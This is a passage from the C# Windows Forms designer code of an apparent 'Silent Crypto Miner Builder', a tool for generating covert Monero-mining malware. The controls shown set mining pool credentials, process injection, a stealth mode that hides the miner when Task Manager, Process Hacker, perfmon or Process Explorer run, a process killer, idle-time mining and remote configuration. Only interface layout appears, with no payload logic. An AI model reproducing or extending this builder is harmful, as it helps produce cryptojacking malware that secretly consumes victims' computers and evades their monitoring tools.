            this.label19.Location = new System.Drawing.Point(13, 132);
            this.label19.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(75, 17);
            this.label19.TabIndex = 125;
            this.label19.Text = "Kill Targets:";
            // 
            // txtKillTargets
            // 
            this.txtKillTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtKillTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtKillTargets.Location = new System.Drawing.Point(14, 151);
            this.txtKillTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtKillTargets.MaxLength = 32767;
            this.txtKillTargets.MultiLine = false;
            this.txtKillTargets.Name = "txtKillTargets";
            this.txtKillTargets.Size = new System.Drawing.Size(142, 24);
            this.txtKillTargets.TabIndex = 122;
            this.txtKillTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtKillTargets.UseSystemPasswordChar = false;
            this.txtKillTargets.WordWrap = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.ForeColor = System.Drawing.Color.Gray;
            this.label1.Location = new System.Drawing.Point(13, 88);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(97, 17);
            this.label1.TabIndex = 121;
            this.label1.Text = "Stealth Targets:";
            // 
            // txtStealthTargets
            // 
            this.txtStealthTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStealthTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtStealthTargets.Location = new System.Drawing.Point(14, 107);
            this.txtStealthTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtStealthTargets.MaxLength = 32767;
            this.txtStealthTargets.MultiLine = false;
            this.txtStealthTargets.Name = "txtStealthTargets";
            this.txtStealthTargets.Size = new System.Drawing.Size(142, 24);
            this.txtStealthTargets.TabIndex = 118;
            this.txtStealthTargets.Text = "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe";
            this.txtStealthTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStealthTargets.UseSystemPasswordChar = false;
            this.txtStealthTargets.WordWrap = false;
            // 
            // chkAdvParam
            // 
            this.chkAdvParam.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAdvParam.BackColor = System.Drawing.Color.Transparent;
            this.chkAdvParam.Checked = false;
            this.chkAdvParam.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAdvParam.ForeColor = System.Drawing.Color.Black;
            this.chkAdvParam.Location = new System.Drawing.Point(228, 68);
            this.chkAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.chkAdvParam.Name = "chkAdvParam";
            this.chkAdvParam.Size = new System.Drawing.Size(178, 24);
            this.chkAdvParam.TabIndex = 111;
            this.chkAdvParam.Text = "Advanced Parameters";
            this.chkAdvParam.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAdvParam_CheckedChanged);
            // 
            // txtAdvParam
            // 
            this.txtAdvParam.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAdvParam.Enabled = false;
            this.txtAdvParam.ForeColor = System.Drawing.Color.Silver;
            this.txtAdvParam.Location = new System.Drawing.Point(228, 96);
            this.txtAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.txtAdvParam.MaxLength = 32767;
            this.txtAdvParam.MultiLine = false;
            this.txtAdvParam.Name = "txtAdvParam";
            this.txtAdvParam.Size = new System.Drawing.Size(178, 24);
            this.txtAdvParam.TabIndex = 110;
            this.txtAdvParam.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAdvParam.UseSystemPasswordChar = false;
            this.txtAdvParam.WordWrap = false;
            // 
            // chkRemoteConfig
            // 
            this.chkRemoteConfig.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkRemoteConfig.BackColor = System.Drawing.Color.Transparent;
            this.chkRemoteConfig.Checked = false;
            this.chkRemoteConfig.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkRemoteConfig.ForeColor = System.Drawing.Color.Black;
            this.chkRemoteConfig.Location = new System.Drawing.Point(228, 12);
            this.chkRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.chkRemoteConfig.Name = "chkRemoteConfig";
            this.chkRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.chkRemoteConfig.TabIndex = 115;
            this.chkRemoteConfig.Text = "Remote Configuration";
            this.chkRemoteConfig.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkRemoteConfig_CheckedChanged);
            // 
            // txtRemoteConfig
            // 
            this.txtRemoteConfig.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtRemoteConfig.Enabled = false;
            this.txtRemoteConfig.ForeColor = System.Drawing.Color.Silver;
            this.txtRemoteConfig.Location = new System.Drawing.Point(228, 40);
            this.txtRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.txtRemoteConfig.MaxLength = 32767;
            this.txtRemoteConfig.MultiLine = false;
            this.txtRemoteConfig.Name = "txtRemoteConfig";
            this.txtRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.txtRemoteConfig.TabIndex = 114;
            this.txtRemoteConfig.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtRemoteConfig.UseSystemPasswordChar = false;
            this.txtRemoteConfig.WordWrap = false;
            // 
            // MinerXMR
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formMinerXMR);
            this.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "MinerXMR";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MinerXMR_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formMinerXMR.ResumeLayout(false);
            this.MephTabcontrol2.ResumeLayout(false);
            this.TabPage1.ResumeLayout(false);
            this.TabPage1.PerformLayout();
            this.TabPage6.ResumeLayout(false);
            this.TabPage6.PerformLayout();
            this.TabPage3.ResumeLayout(false);
            this.TabPage3.PerformLayout();
            this.ResumeLayout(false);

        }

        internal MephTheme formMinerXMR;
        internal System.ComponentModel.BackgroundWorker BackgroundWorker2;
        internal MephTabcontrol MephTabcontrol2;
        internal TabPage TabPage1;
        internal LinkLabel labelWiki;
        internal Label Label10;
        internal Label Label5;
        internal MephComboBox comboInjection;
        internal Label Label8;
        internal MephTextBox txtPoolUsername;
        internal MephTextBox txtPoolURL;
        internal Label Label6;
        internal Label Label7;
        internal MephTextBox txtPoolPassowrd;
        internal TabPage TabPage6;
        internal Label Label27;
        internal MephToggleSwitch toggleStealth;
        internal Label Label24;
        internal Label Label23;
        internal MephTextBox txtIdleWait;
        internal MephComboBox txtIdleCPU;
        internal MephComboBox txtMaxCPU;
        internal Label Label22;
        internal Label Label18;
        internal MephToggleSwitch toggleSSL;
        internal Label Label13;
        internal MephToggleSwitch toggleCPU;
        internal Label Label12;
        internal MephToggleSwitch toggleNicehash;
        internal Label Label11;
        internal Label Label4;
        internal MephToggleSwitch toggleGPU;
        internal Label Label3;
        internal TabPage TabPage3;
        internal MephCheckBox chkRemoteConfig;
        internal MephTextBox txtRemoteConfig;
        internal Label label32;
        internal MephToggleSwitch toggleProcessKiller;
        internal MephToggleSwitch toggleIdle;
        internal Label label19;
        internal MephTextBox txtKillTargets;
        internal Label label1;
        internal MephTextBox txtStealthTargets;
        internal MephCheckBox chkAdvParam;
        internal MephTextBox txtAdvParam;
        internal Label label33;
        internal MephComboBox comboAlgorithm;
        internal MephCheckBox chkAPI;
        internal MephTextBox txtAPI;
    }
}